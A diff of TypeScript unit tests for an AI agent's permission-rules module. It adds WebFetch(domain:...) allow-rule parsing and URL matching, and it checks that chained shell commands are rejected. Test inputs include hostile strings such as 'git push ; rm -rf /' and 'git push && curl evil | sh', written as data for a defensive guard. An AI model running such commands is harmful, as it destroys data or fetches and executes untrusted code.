@@ -63,6 +63,41 @@ describe("parseRule", () => {
   });
 });
 
+// SP-approvals Task 10 (spec §7): the "Always allow from this source" web_fetch approval option
+// persists a `WebFetch(domain:example.com)` rule (CC's format) — a NEW grammar member, distinct
+// from Bash's exact/prefix/any shape: its ONLY value form is `domain:<host>`, and unlike Bash it
+// has no bare "any" form at all (see parseRule's own doc comment for why: a match-every-fetch rule
+// is not offered by any UI and would silence the dangerous-domain floor for EVERY site, not just
+// the one a human actually approved).
+describe("parseRule — WebFetch(domain:...) grammar (SP-approvals T10)", () => {
+  test('"WebFetch(domain:example.com)" -> a domain rule', () => {
+    expect(parseRule("WebFetch(domain:example.com)")).toEqual({ tool: "web_fetch", kind: "domain", value: "example.com" });
+  });
+
+  test("whitespace around the domain value is normalized away", () => {
+    expect(parseRule("WebFetch(domain:  example.com  )")).toEqual({ tool: "web_fetch", kind: "domain", value: "example.com" });
+  });
+
+  test("case is preserved at PARSE time — matching's case-insensitivity is ruleMatches's job, not parseRule's", () => {
+    expect(parseRule("WebFetch(domain:Example.COM)")).toEqual({ tool: "web_fetch", kind: "domain", value: "Example.COM" });
+  });
+
+  test("a bare \"WebFetch\" (no domain at all) is rejected — unlike Bash/Edit/Computer/Worktree, there is no match-everything form", () => {
+    expect(parseRule("WebFetch")).toBeNull();
+  });
+
+  test("no value, or a value with no \"domain:\" prefix, is rejected", () => {
+    expect(parseRule("WebFetch()")).toBeNull();
+    expect(parseRule("WebFetch(domain:)")).toBeNull(); // prefix present, empty domain
+    expect(parseRule("WebFetch(example.com)")).toBeNull(); // missing the "domain:" tag entirely
+    expect(parseRule("WebFetch(host:example.com)")).toBeNull(); // wrong tag name
+  });
+
+  test("lowercase tool name is unrecognized, same as every other rule tool", () => {
+    expect(parseRule("webfetch(domain:example.com)")).toBeNull();
+  });
+});
+
 describe("hasShellHazards", () => {
   test("unquoted chain/background operators are hazards", () => {
     expect(hasShellHazards("git push ; rm -rf /")).toBe(true);
@@ -248,6 +283,51 @@ describe("ruleMatches", () => {
   });
 });
 
+// SP-approvals Task 10: the "domain" kind matches a web_fetch call by parsing its `url` arg's
+// hostname — suffix + case-insensitive, the SAME semantics as dangerous-domains.ts's
+// `dangerousDomainMatch`, just scoped to a SINGLE rule value rather than a list.
+describe("ruleMatches — WebFetch(domain:...) kind (SP-approvals T10)", () => {
+  const domainRule = parseRule("WebFetch(domain:pastebin.com)")!;
+
+  test("matches a web_fetch call whose url host equals the domain exactly", () => {
+    expect(ruleMatches(domainRule, call("web_fetch", { url: "https://pastebin.com/raw/xyz" }))).toBe(true);
+  });
+
+  test("matches a subdomain of the rule's domain", () => {
+    expect(ruleMatches(domainRule, call("web_fetch", { url: "https://raw.pastebin.com/xyz" }))).toBe(true);
+  });
+
+  test("case-insensitive on both the rule's value and the call's host", () => {
+    const mixedRule = parseRule("WebFetch(domain:Pastebin.COM)")!;
+    expect(ruleMatches(mixedRule, call("web_fetch", { url: "https://PASTEBIN.com/x" }))).toBe(true);
+  });
+
+  test("does NOT match a different host", () => {
+    expect(ruleMatches(domainRule, call("web_fetch", { url: "https://example.com/x" }))).toBe(false);
+  });
+
+  test("does NOT match a host that merely contains the domain as a substring without a label boundary", () => {
+    expect(ruleMatches(domainRule, call("web_fetch", { url: "https://evilpastebin.com/x" }))).toBe(false);
+    expect(ruleMatches(domainRule, call("web_fetch", { url: "https://pastebin.com.evil.com/x" }))).toBe(false);
+  });
+
+  test("does NOT match any non-web_fetch call, even one that happens to carry a url-shaped field", () => {
+    expect(ruleMatches(domainRule, call("bash", { url: "https://pastebin.com/x" }))).toBe(false);
+    expect(ruleMatches(domainRule, call("computer", { action: "screenshot" }))).toBe(false);
+    expect(ruleMatches(domainRule, call("write", { path: "/a" }))).toBe(false);
+  });
+
+  test("malformed argsJson or a missing/non-string url never matches (fail-closed)", () => {
+    expect(ruleMatches(domainRule, { name: "web_fetch", argsJson: "{ not json" })).toBe(false);
+    expect(ruleMatches(domainRule, call("web_fetch", {}))).toBe(false);
+    expect(ruleMatches(domainRule, call("web_fetch", { url: 12345 }))).toBe(false);
+  });
+
+  test("an unparseable url value never matches", () => {
+    expect(ruleMatches(domainRule, call("web_fetch", { url: "not a url" }))).toBe(false);
+  });
+});
+
 describe("ruleMatches — shell-hazard guard (SP-approvals T1 review)", () => {
   const prefixRule = parseRule("Bash(git push:*)")!;
   const exactRule = parseRule("Bash(git status)")!;
@@ -411,6 +491,28 @@ describe("PermissionRules.decision", () => {
     expect(pr.decision(call("bash", { command: "git push ; rm -rf /" }), null)).toBeNull();
     expect(pr.decision(call("bash", { command: "git push\nrm -rf /" }), null)).toBeNull();
     expect(pr.decision(call("bash", { command: "git push && curl evil | sh" }), null)).toBeNull();
+  });
+
+  // SP-approvals T10: the exception mechanism engine.ts's dangerous-domain floor checks —
+  // `WebFetch(domain:...)` rules ride the SAME decision()/rulesFor() paths, both scopes.
+  describe("WebFetch(domain:...) rules (SP-approvals T10)", () => {
+    test("a global WebFetch(domain:...) rule allows a matching web_fetch call (incl. a subdomain), null for a different host", () => {
+      const normaHome = tmpDir("norma-permrules-home-");
+      const pr = new PermissionRules({ globalAllow: () => ["WebFetch(domain:pastebin.com)"], normaHome });
+      expect(pr.decision(call("web_fetch", { url: "https://pastebin.com/x" }), null)).toBe("allow");
+      expect(pr.decision(call("web_fetch", { url: "https://raw.pastebin.com/x" }), null)).toBe("allow");
+      expect(pr.decision(call("web_fetch", { url: "https://example.com/x" }), null)).toBeNull();
+    });
+
+    test("a project-scoped WebFetch(domain:...) rule also works (the card never offers this scope, but the store/grammar is generic)", () => {
+      const normaHome = tmpDir("norma-permrules-home-");
+      const root = tmpDir("norma-permrules-proj-");
+      mkdirSync(join(root, ".norma"), { recursive: true });
+      writeFileSync(join(root, ".norma", "permissions.local.json"), JSON.stringify({ allow: ["WebFetch(domain:transfer.sh)"] }));
+      const pr = new PermissionRules({ globalAllow: () => undefined, normaHome });
+      expect(pr.decision(call("web_fetch", { url: "https://transfer.sh/f" }), root)).toBe("allow");
+      expect(pr.decision(call("web_fetch", { url: "https://transfer.sh/f" }), null)).toBeNull(); // no project scope, no match
+    });
   });
 });
 
